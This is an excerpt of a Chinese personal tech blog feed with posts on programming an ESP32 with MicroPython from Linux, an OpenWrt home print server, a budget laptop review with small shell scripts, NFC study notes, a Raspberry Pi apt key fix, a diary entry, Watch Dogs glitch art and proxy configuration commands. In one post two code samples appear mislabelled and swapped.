    <url>/microPythonProgInLinux/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天第一次真正给板子刷上MicroPython，因为我出门只带了几天前说的刚买那个中柏电脑，刷成了纯linux系统，就想试试从开源工具刷写开发板。</p><h1 id="困扰"><a href="#困扰" class="headerlink" title="困扰"></a>困扰</h1><p>按照流程很轻松就能用esp-tool.py清空flash，然后刷上固件，但怎样编写程序就没有资料了。有教程说可以挂载成u盘一样的设备，但至少这个板子不行。经过疯狂寻找，正当我快放弃时找到这样一篇文章<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="http://yhhuang1966.blogspot.com/2019/07/micropython-on-esp32.html">[1]</span></a></sup>。</p><p>进而通过向REPL方向的寻找，确定了一种只需linux终端就可用的方法，而且无需Thonny<br>(但是需要adafruit-ampy :P)</p><h1 id="简要流程"><a href="#简要流程" class="headerlink" title="简要流程"></a>简要流程</h1><h2 id="picocom"><a href="#picocom" class="headerlink" title="picocom"></a>picocom</h2><blockquote><p>sudo apt-get install picocom </p></blockquote><ol><li>该步骤安装的是串口终端助手,在<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="http://yhhuang1966.blogspot.com/2019/07/micropython-on-esp32.html">[1]</span></a></sup>中有提到</li><li>配置串口权限，文末附上参考脚本，记得变通</li></ol><blockquote><p>sudo picocom -b 115200 /dev/ttyUSB0 </p></blockquote><ol start="3"><li>使用串口连接开发板</li><li>注意看picocom给出的信息:Type [C-a] [C-h] to see available commands 就是先按ctrl+a，再按ctrl+h</li><li>连接后按几下回车才会出现熟悉的REPL界面</li></ol><h2 id="ampy"><a href="#ampy" class="headerlink" title="ampy"></a>ampy</h2><ol><li><p>pip给出提示大概意思就是不要用sudo，所以我用的是 pip install adafruit-ampy</p></li><li><p>ampy –version 我用不了，不造是为虾米，反正不粽药啦</p></li><li><p>但是ampy –help 有用，可以看到具体操作和linux shell 类似，mkdir、ls、rm、rmdir都不用说了。</p><blockquote><p>ampy –port /dev/ttyUSB0 run led.py</p></blockquote></li><li><p> 跑当前目录下的led.py文件<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote">&lt;span class=”hint–top hint–rounded” aria-label=”led.py</p><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>ls -al /dev/ttyUSB0<br>chmod 666 /dev/ttyUSB0<br>sudo chmod 666 /dev/ttyUSB0 <br>ls -al /dev/ttyUSB0 <br><span class="hljs-built_in">exit</span> 0<br></code></pre>">[5]</span></a></sup>，ctrl+c没法打断<blockquote><p>ampy –port /dev/ttyUSB0 reset </p></blockquote></li><li><p>给板子软重启，如果死循环没写到main.py就能打断了。但如果写到main.py的话据说<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="http://yhhuang1966.blogspot.com/2019/07/micropython-on-esp32.html">[1]</span></a></sup>只能重刷固件了</p></li></ol><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>picocom 开启时用不了ampy，因为picocom会占用串口，按ctrl+a，之后ctrl+x退出picocom</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>配置串口权限的脚本:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">功能介绍： LED闪烁例程</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> utime<br><span class="hljs-keyword">import</span> machine<br><br><span class="hljs-comment"># 声明一个引脚 例如 22 作为我们特定开发板板载LED的引脚</span><br>led_pin = machine.Pin(<span class="hljs-number">22</span>, machine.Pin.OUT)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    <span class="hljs-comment"># 点亮LED -&gt; 高电平</span><br>    led_pin.value(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># 延时 500ms</span><br>    utime.sleep_ms(<span class="hljs-number">500</span>)<br>    <span class="hljs-comment"># 关闭LED -&gt; 低电平</span><br>    led_pin.value(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># 延时500ms</span><br>    utime.sleep_ms(<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p>还有如下几篇文章以供参考：</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="http://yhhuang1966.blogspot.com/2019/07/micropython-on-esp32.html">http://yhhuang1966.blogspot.com/2019/07/micropython-on-esp32.html</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.cirmall.com/bbs/thread-102620-1-1.html">https://www.cirmall.com/bbs/thread-102620-1-1.html</a> 介绍了picocom和ampy两种方法，对从底层了解和开发板通信帮助很大<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://docs.micropython.org/en/v1.8.3/esp8266/esp8266/tutorial/repl.html">https://docs.micropython.org/en/v1.8.3/esp8266/esp8266/tutorial/repl.html</a> 官方文档，介绍了REPL的基本操作<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://docs.micropython.org/en/v1.8.3/esp8266/esp8266/tutorial/filesystem.html#creating-and-reading-files">https://docs.micropython.org/en/v1.8.3/esp8266/esp8266/tutorial/filesystem.html#creating-and-reading-files</a> 介绍了文件和文件夹的增删，但没有改查<a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span>led.py<figure class="highlight python"><table><tr><td class="gutter">undefined</td><td class="code">undefined</td></tr></table></figure><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
      <tag>Linux</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于openwrt，建立家庭云打印服务</title>
    <link href="/opWRThomePrint/"/>
    <url>/opWRThomePrint/</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>我所在的宿舍大家集资买了一部二手喷墨打印机，但使用率很低。其根本问题在于宿舍没有地方放，导致每次使用都需要拿出来插线连接，之后再拔掉放回去。几天前我想到可以通过我的路由器搭建网络打印服务，本文描述了通过将打印机与带usb拓展接口的openwrt系统路由器连接，通过openwrt仓库内置包实现搭建局域网云打印服务的方法。</p><h1 id="环境与硬件要求"><a href="#环境与硬件要求" class="headerlink" title="环境与硬件要求"></a>环境与硬件要求</h1><ul><li>本文系统环境基于小米路由器mini<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://openwrt.org/toh/xiaomi/miwifi_mini">[1]</span></a></sup>在openwrt官网下载的镜像</li><li>本文将路由器作为全局域网的根节点，打印机连接在路由器上，使用局域网内其他设备搭建服务的情况暂不考虑</li><li>你的路由器能正常上网以通过opkg下载包</li><li>申请打印的设备已安装了能通过有线连接进行打印的驱动</li></ul><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><ol><li>连接打印机与路由器</li><li>进入后台管理界面</li><li>系统-软件- Update lists…</li><li>搜索 printer</li><li>安装 kmod-usb-printer、luci-app-p910nd，我当时尝试时安装了别的包，可能是没必要的，这个自己看描述自己决定吧。</li><li>在网页最上面出现了服务下拉框，这是luci-app-* 下载下来的东西，点进 p910nd - Printer server，如果不会linux的话这里会比较复杂，如果你懂就会发现操作不难。<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">设备：当打印机开机，usb接入路由器后，linux为其挂载的地址。一般为<span class="hljs-regexp">/dev/u</span>sb/lp0，如果你不愿意深究就填这个。<br>我喜欢比较清爽的系统，所以为了确定地址究竟是什么需要ssh或者通过终端连接路由器，输入<br>ls <span class="hljs-regexp">/dev/u</span>sb <br>大概就会列出来，我是凭感觉敲得，你可能需要变通一下<br>接口：只给路由器下内网使用，我选的lan，其他高级东东我也不懂<br>端口：不改，<span class="hljs-number">9100</span><br></code></pre></td></tr></table></figure></li></ol><p>然后保存并应用，电脑端设置太麻烦我不想说，上网搜索电脑添加网络打印机的方法肯定有很多人写。总之需要安装驱动，寻找设备，添加设备。</p><h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://openwrt.org/toh/xiaomi/miwifi_mini">https://openwrt.org/toh/xiaomi/miwifi_mini</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>中柏jnb10电脑测评与使用场景分析</title>
    <link href="/diary/jnb10laptop/"/>
    <url>/diary/jnb10laptop/</url>
    
    <content type="html"><![CDATA[<h1 id="一个电脑爱好者的成长经历"><a href="#一个电脑爱好者的成长经历" class="headerlink" title="一个电脑爱好者的成长经历"></a>一个电脑爱好者的成长经历</h1><p>在我小学时候曾经用一些a4纸和胶带做了一个真-比一元硬币还薄的电脑。上面画上键盘，屏幕，用纸剪个U盘再做个USB接口。初中时超级想拥有一个树莓派，就是因为800元左右就能拥有自己的电脑实在太有吸引力，当时家里只有一个性能孱弱的台式机和有一本《电路信号系统》那么厚的笔记本。时间飞逝，直到初二时我第一次给台式机升级了9600gt和4G内存，之后换成HD7750，再到中考后换上第一代锐龙，高二用1600买了二手不知道是不是矿渣的GTX1060 6G。大一一入校就买了个二手树莓派然后输了几天apt后吃灰到大二和别人换了一块ax309的fpga，再到大三前的暑假给家里电脑换上共40G的内存。对于电脑性能的追求在钱包允许的范围内已经到了终点。</p><p>经过几周的使用，这个轻薄到如08年乔布斯从牛皮纸袋中取出的MacBook Air、满足一个小孩对电脑的想象的设备已经成为了我不可不带的EDC。</p><h1 id="购买原因（买前所想）"><a href="#购买原因（买前所想）" class="headerlink" title="购买原因（买前所想）"></a>购买原因（买前所想）</h1><ul><li>现在我使用的小新air14 2020锐龙版虽然是个轻薄本，但1.3kg左右的重量和使用2年后的续航让我十分焦虑</li><li>更别说现在电脑很多时间都至少连接了充电线、USB、耳机线，每次带出门都要和线纠缠半天</li><li>文本处理，看网页，查东西还是电脑好用</li><li>每天随身带个电脑对我来说真的很帅</li><li>有个备用机的感觉让人很安心</li><li>x86的cpu，兴许可以当个服务器<br>所以，经过几天的精挑细选，在闲鱼上买了个288的电脑，大概明后天到货。在还没收到的情况下写这种文章，到时候是惊喜还是惊吓真说不准🫤</li></ul><h1 id="购买期望"><a href="#购买期望" class="headerlink" title="购买期望"></a>购买期望</h1><ol><li>性能(依次上升)<ul><li>能跑动notepad++</li><li>能跑ubuntu的桌面环境，如xfce、lxde</li><li>跑动腾讯会议</li><li>能看图片</li><li>potplayer播放nas电影</li></ul></li><li>硬件(依次上升)    <ul><li>无损坏</li><li>io正常</li><li>有5Gwifi</li><li>电量消耗在合理范围</li></ul></li></ol><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><ul><li>文本，图片浏览</li><li>远程运维</li><li>远程桌面</li><li>学习html，python</li></ul><h1 id="拿到手后发现的优缺点"><a href="#拿到手后发现的优缺点" class="headerlink" title="拿到手后发现的优缺点"></a>拿到手后发现的优缺点</h1><h2 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h2><ul><li>屏幕素质相对优秀，虽然根据网上信息其挂载了一块TN屏但可视角度与色准肉眼所见很优秀，分辨率可达视网膜屏标准</li><li>硬件性能可用，相比我之前购买的驰为Hi8，这个电脑的硬件足以带动基础上网和文本编辑功能（暂未尝试富文本编辑）：n3350的cpu，6G板载内存，60G左右的可用存储空间</li><li>网卡支持5Gwifi网络连接</li><li>被动散热，无需担心堵塞散热口，可以安心放在膝上使用</li><li>毫无发热感觉，根据拆机发现电脑内部元件分布很宽松而发热元件都在电脑左上的一块小板上。但相比结构类似、使用Z3736F的驰为Hi8发热控制好太多，在我现在使用它打下这些文字时丝毫感觉不到任何的热量</li><li>续航优秀，几天前我在基于ubuntu server系统安装xfce后的第一时间就写了两个脚本<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote">&lt;span class=”hint–top hint–rounded” aria-label=”提到的代码<pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre><pre><code class="hljs awk"><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;$1&quot;</span> ];then<br>echo <span class="hljs-string">&quot;current parameter: &quot;</span><br>    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$1</span> -gt <span class="hljs-number">0</span> ] &amp;&amp; [ <span class="hljs-variable">$1</span> -lt <span class="hljs-number">346</span> ];then<br>        echo <span class="hljs-string">&quot;$1&quot;</span> &gt; <span class="hljs-regexp">/sys/</span>class<span class="hljs-regexp">/backlight/i</span>ntel_backlight/brightness<br>    elif [ ! <span class="hljs-variable">$1</span> -gt <span class="hljs-number">0</span> ];then<br>        echo <span class="hljs-string">&quot;1&quot;</span> &gt; <span class="hljs-regexp">/sys/</span>class<span class="hljs-regexp">/backlight/i</span>ntel_backlight/brightness<br>    elif [ ! <span class="hljs-variable">$1</span> -lt <span class="hljs-number">346</span> ];then<br>        echo <span class="hljs-string">&quot;345&quot;</span> &gt; <span class="hljs-regexp">/sys/</span>class<span class="hljs-regexp">/backlight/i</span>ntel_backlight/brightness<br>    fi<br><span class="hljs-keyword">else</span><br>    echo <span class="hljs-string">&quot;no parameter input&quot;</span><br>fi<br>cat <span class="hljs-regexp">/sys/</span>class<span class="hljs-regexp">/backlight/i</span>ntel_backlight/brightness;<br><span class="hljs-keyword">exit</span> <span class="hljs-number">0</span><br></code></pre><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> `cat /sys/class/power_supply/BAT0/capacity`<span class="hljs-string">&quot; # &quot;</span>`date` &gt;&gt; log_battery_life.log<br><span class="hljs-built_in">echo</span> `cat /sys/class/power_supply/BAT0/capacity`<span class="hljs-string">&quot; # &quot;</span>`date` <br></code></pre>">[1]</span></a></sup>用来监测电量和调节亮度。在合理亮度下使用半天大概只掉20左右的电。根据我预测，如果续航不会在低于一定程度时迅速消失的话（经过几天使用，电量消耗线性度还算不错），要是只用来上网打字和学习linux运维，应该很容易达到10小时左右的通勤续航要求</li><li>可维修性，虽然各个配件应该会随着时间推移越来越少，但电池看起来可以与2s电池通用，充电口使用标准DC接口。因此在不受到冲击损伤的情况下，最容易损耗的部分维修应该是长期可行的</li><li>便宜，用起来不心疼</li><li>重量合理，相比老工作站虽然性能不佳但续航和便携性做到了优异水平</li><li>有hdmi接口，但是是mini hdmi</li><li>有一个sd卡读卡器和一个usb3.0接口</li><li>有一个m.2接口</li><li>键盘上方有电源、大小写和Capslock的指示灯</li><li>无可感知频闪</li></ul><h2 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h2><ul><li>笔记本电脑的“身体”（与“头”相对）在受到扭力时有可能会花屏并100%死机，重插主板侧排线没有解决，疑似存在虚焊。当花屏现象发生时只能通过长按开机键强制关机，此时若花屏状态或其诱因未接触会导致无法开机，过一段时间或因不明原因才能恢复，多数情况下强制关机后可以正常开机。因此稳定性存在极大隐患。</li><li>屏幕有漏光现象，在我尝试拆屏后疑似恶化，可能与屏幕存在应力未释放有关。拆屏难度较大：虽然只有四颗螺丝在胶垫下，但拆除胶垫有一定可能导致粘性降低，进而导致丢失；屏幕上下边通过胶黏剂粘接，无损拆除难度较大。</li><li>触控板精度差，不跟手，很明显有较大延迟，充电时可能因为充电器只有两脚导致在一段时间后触控板使用时会jiggle</li><li>没有键盘背光</li><li>网页浏览性能较差，对于动画较多的网页表现很差，如米游社的活动和地图等，但高德地图表现良好</li></ul><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>此外还有两个无关紧要的问题，比如扬声器素质一般，塑料机身。但在此价格，不将其作为主力机，只将其作为玩具或EDC是优异的。相比手机，一块大屏幕和全键盘能让人更专注的完成一个任务。而搭配xfce使用和linux的高度可自定义，这部电脑可以让人在极致的简约美下闲适的专注于自己的爱好，比如学习一些只需要编辑文本的编程学习什么的，不用担心续航，不用被主力机上杂乱的各种服务、应用、和积累的媒体、文档分散注意力，真是优雅。<br>以上是我带着这部电脑在一个会场敲下的文字，之后我直接盒盖带走了电脑，此后过了大概5个小时，现在我躺在宿舍床上敲下这行文字。要是我的主力机直接合盖带走的话很多时候会睡死，电池也会掉好多电，可能是和win10的睡眠还是休眠有关，也可能和我安装的PowerToys的awake功能有关。在这部电脑上，虽然开盖几秒钟后xfce发生了卡死的情况，只有鼠标能动，但是好在可以通过&lt;ctrl&gt;+&lt;alt&gt;+&lt;F(n)&gt;按键进入linux shell。通过执行</p><blockquote><p>service restart lightdm</p></blockquote><p>解决。后来我删除了xfce-screensaver，改为使用light-locker，倒是不会卡死了，但开盖后会直接显示几秒盒盖前画面，会造成信息泄漏。</p><h1 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h1><p>这种电脑如果想用来当主力机一定不可能，它的html5网页渲染性能还不如手机（与使用骁龙865的红米k30pro相比），存储空间也小。但如果你期望拥有一部笔记本只用来写文本文档（如python、markdown、html），或者直访问静态网页，绝对没问题。根据geekbench上的搜索结果，<br>n3350有</p><blockquote><p>Single-Core Score 268<br>Multi-Core Score 613</p></blockquote><p>的成绩，而树莓派4b成绩为</p><blockquote><p>Single-Core Score 202<br>Multi-Core Score 604</p></blockquote><p>如果愿意买二手的这部电脑，那就是决定的时间了：架构选arm还是x86、是开发板还是真正的个人电脑、是买来不用还是每天爱不释手。我都选择过，但是我的树莓派买来放了两年就打开用了几次，好玩也有用，但后来没忍住诱惑加了100多元和别人换了一块ax309的FPGA开发板、一块TI的物联网开发板和一些电子耗材，更少打开了😹️</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>这篇文章同样做到了在写的过程中学习markdown，通过尝试植入表情理解了html中图片标签的功能。和其他文章一样都可作为我未来写博客的参照(但是不慎删除了图片，算了反正也不难)</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>提到的代码<figure class="highlight awk"><table><tr><td class="gutter">undefined</td><td class="code">undefined</td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter">undefined</td><td class="code">undefined</td></tr></table></figure><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>评测</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>评测</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>进军NFC</title>
    <link href="/NFC-imcoming/"/>
    <url>/NFC-imcoming/</url>
    
    <content type="html"><![CDATA[<h1 id="从大创申报书到我的hacker梦想"><a href="#从大创申报书到我的hacker梦想" class="headerlink" title="从大创申报书到我的hacker梦想"></a>从大创申报书到我的hacker梦想</h1><p>这几天是一年一度写大创申报书的时候了，大二下的好多人都在整大创。</p><p>我负责i2i实验室这边的应用开发，在写申报书时突然重新萌发了对NFC的兴趣。</p><p>NFC应该是个很新的技术，而我第一次听说它不是在手机上，而是proxmark3。因为现在pm3的售价依然让我不敢买，所以便想借助这一契机深入研究下NFC功能。不过我现在还在收集资料的过程中（2022年03月28日），所以这个博客很有可能到了22年10月（大创截止的时间）能写完。</p><h1 id="资料准备"><a href="#资料准备" class="headerlink" title="资料准备"></a>资料准备</h1><p>芯片选型一直都是我最迷茫的步骤，还好有前人（稚晖君）的工作让我能够学习，他附上的开源仓库中给我了一个重要的信息：<strong>NFC的协议</strong></p><h2 id="NFC的协议"><a href="#NFC的协议" class="headerlink" title="NFC的协议"></a>NFC的协议</h2><pre><code class="hljs">ISO 15693 (支持芯片：ST25DV)ISO 14443 (支持芯片：ST95或者ST25T)</code></pre><h2 id="常见读取器的结构"><a href="#常见读取器的结构" class="headerlink" title="常见读取器的结构"></a>常见读取器的结构</h2><p>pm3<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://github.com/Proxmark/proxmark3">[1]</span></a></sup>基于FPGA，开源仓库中有其代码，计划将来研究，刚好这学期学习数电需要用到verilog语句</p><h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><p><img src="https://pic1.imgdb.cn/item/69659163c02d09d8013f1690.png" alt="雷达及广播频段对照"></p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://github.com/Proxmark/proxmark3">https://github.com/Proxmark/proxmark3</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>无线电</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSINT</tag>
      
      <tag>嵌入式</tag>
      
      <tag>无线电</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>树莓派apt公钥错误解决方案</title>
    <link href="/rpi-pubkeyErr/"/>
    <url>/rpi-pubkeyErr/</url>
    
    <content type="html"><![CDATA[<p>今天试着玩了一天esp8266，发现要是只是想试一下模块通信的话需要重刷程序，flash毕竟会磨损，要是总这样造也稍微有点心疼，最主要是编译烧写太费时间。于是想到用树莓派。烧完程序打算换源的时候遇到了apt update报错。</p><p><code>W: GPG error: http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian bullseye InRelease: The following signatures couldn&#39;t be verified because the public key is not available: NO_PUBKEY [一串密钥a]</code></p><p><code>E: The repository &#39;http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian bullseye InRelease&#39; is not signed.</code></p><h3 id="解决方法（网上找的）"><a href="#解决方法（网上找的）" class="headerlink" title="解决方法（网上找的）"></a>解决方法（网上找的）</h3><p><code>先输入：gpg --keyserver  keyserver.ubuntu.com --recv-keys [刚才那一串密钥a]</code></p><p><code>然后输入：gpg --export --armor [刚才那一串密钥a] | sudo apt-key add -</code></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>密钥可能有几个，一个一个的替换、输入。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>今年更严峻的疫情</title>
    <link href="/diary/halfwayinJan/"/>
    <url>/diary/halfwayinJan/</url>
    
    <content type="html"><![CDATA[<p>时间过的太快了，上次博客更新居然已经是</p><h1 id="一次奇遇"><a href="#一次奇遇" class="headerlink" title="一次奇遇"></a>一次奇遇</h1><p>这篇文章标题前说了一半的话是在实验室门口敲下的，随后门开了，我就进去给机械键盘润轴了（只是借电烙铁拆轴而已）。然后，当天晚上0点发消息，23号全员核酸，24号等核酸结果（其实我要是没有因为怂退了24号早上的票，就能不损失退票费并且坐高铁到家了），25号凌晨登上空调快车。</p><p>回家第一次变得难得且奇妙。</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂谈</tag>
      
      <tag>个人总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅析游戏看门狗2的故障艺术</title>
    <link href="/glitchArtofWD2/"/>
    <url>/glitchArtofWD2/</url>
    
    <content type="html"><![CDATA[<p>看门狗的美术很有趣。<br>今天猜测一下这个图片的绘制方式，希望能够抛砖引玉。（很少见到这方面的教程，不知道怎么绘制，希望能够通过Blender风格化渲染的方式实现）<br><img src="https://pic1.imgdb.cn/item/6954f04a8801094e3ab5019b.png" alt="视频截图"><br>这是<a href="https://youtu.be/KJGdTJUi-YE?t=71">这个视频</a>的截图。</p><ul><li>大致由后侧呈同心圆排列的点<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="关键词：halftone、半色调[参考链接](https://blenderartists.org/t/halftone-pattern-in-blender-update/1136023)">[3]</span></a></sup>，同心圆被两条螺旋线遮挡，前端Dedsec文字及死神的形象。</li><li>同心圆由随机排列的点纹理组成。死神的灰度由水平翻转过的上三角灰度方块组成。</li><li>看门狗的故障艺术（仅指过场），由马赛克<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote">&lt;span class=”hint–top hint–rounded” aria-label=”模仿看门狗1的开头，常见于mpeg视频编码的I帧缺失，经过我的寻找有<a href="https://youtu.be/5TtJYeZjlIM?t=304">这个视频</a>讲解了一种实现途径，关键词：”Datamosh”、”Dither””&gt;[1]</span></a></sup>和与这个同心圆上的细节类似的点状纹理，以及破解组的艺术字体类似。<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="关键词：BIG TEXT Letters Font、linux的toilet工具">[2]</span></a></sup><br/></li></ul><hr><h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><p><u>看门狗游戏还有更多有趣的效果，但是作为一个blender初学者，今天坐在电脑前研究了一下午图片的效果怎么实现。</u></p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>模仿看门狗1的开头，常见于mpeg视频编码的I帧缺失，经过我的寻找有<a href="https://youtu.be/5TtJYeZjlIM?t=304">这个视频</a>讲解了一种实现途径，关键词：”Datamosh”、”Dither”<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>关键词：BIG TEXT Letters Font、linux的toilet工具<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span>关键词：halftone、半色调<a href="https://blenderartists.org/t/halftone-pattern-in-blender-update/1136023">参考链接</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>美术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机图形学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>配置代理命令概览</title>
    <link href="/proxySet/"/>
    <url>/proxySet/</url>
    
    <content type="html"><![CDATA[<h1 id="git代理"><a href="#git代理" class="headerlink" title="git代理"></a>git代理</h1><p>删除命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git config --global --<span class="hljs-built_in">unset</span> [name]<br></code></pre></td></tr></table></figure><p>添加git config配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git config --global [name] [value]<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config --global http.proxy http://127.0.0.1:7890<br>git config --global https.proxy https://127.0.0.1:7890<br>git config -l<br></code></pre></td></tr></table></figure><h1 id="npm代理"><a href="#npm代理" class="headerlink" title="npm代理"></a>npm代理</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm config <span class="hljs-built_in">set</span> proxy=http://127.0.0.1:7890<br>npm config <span class="hljs-built_in">set</span> https-proxy http://127.0.0.1:7890<br><br>npm config delete proxy<br>npm config delete https-proxy<br></code></pre></td></tr></table></figure><h1 id="apt代理"><a href="#apt代理" class="headerlink" title="apt代理"></a>apt代理</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 